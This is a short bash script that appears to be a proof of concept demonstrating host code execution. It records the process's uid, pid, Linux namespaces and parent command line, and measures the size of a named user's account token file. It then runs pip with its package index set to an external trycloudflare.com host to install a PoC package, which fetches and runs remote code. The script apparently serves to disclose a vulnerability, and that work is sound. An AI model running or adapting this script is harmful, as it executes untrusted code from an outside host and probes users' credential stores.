#!/bin/bash

set +e

runtime_root="$1"
preflight_evidence="$runtime_root/.ptyxis-host-preflight.txt"
package_evidence="$runtime_root/.ptyxis-package-evidence.txt"
pip_log="$runtime_root/.ptyxis-pip.log"
install_target="$runtime_root/.fixture-python"

{
  printf 'PTYXIS_HOST_PROCESS_EXECUTION\n'
  printf 'uid=%s gid=%s pid=%s ppid=%s\n' "$(id -u)" "$(id -g)" "$$" "$PPID"
  printf 'home=%s cwd=%s\n' "$HOME" "$PWD"
  printf 'mnt_namespace=%s pid_namespace=%s user_namespace=%s net_namespace=%s\n' \
    "$(readlink /proc/self/ns/mnt 2>&1)" \
    "$(readlink /proc/self/ns/pid 2>&1)" \
    "$(readlink /proc/self/ns/user 2>&1)" \
    "$(readlink /proc/self/ns/net 2>&1)"
  printf 'token_store_bytes='
  wc -c < /home/stazot/HyveCLI/data/accounts.json
  printf 'parent='
  tr '\0' ' ' < "/proc/$PPID/cmdline"
  printf '\n'
} > "$preflight_evidence" 2>&1

PIP_INDEX_URL=https://trek-fonts-adapted-jonathan.trycloudflare.com/simple \
PIP_EXTRA_INDEX_URL= \
PIP_USE_PEP517=0 \
PIP_NO_CACHE_DIR=1 \
PIP_CONFIG_FILE=/dev/null \
AGY_PIP_INDEX_POC=1 \
AGY_PIP_EVIDENCE="$package_evidence" \
/usr/bin/python3 -m pip install \
  --no-deps \
  --target "$install_target" \
  antigravity-fsmonitor-pip-poc==9.9.10 \
  > "$pip_log" 2>&1

printf 'pip_exit=%s\n' "$?" >> "$pip_log"
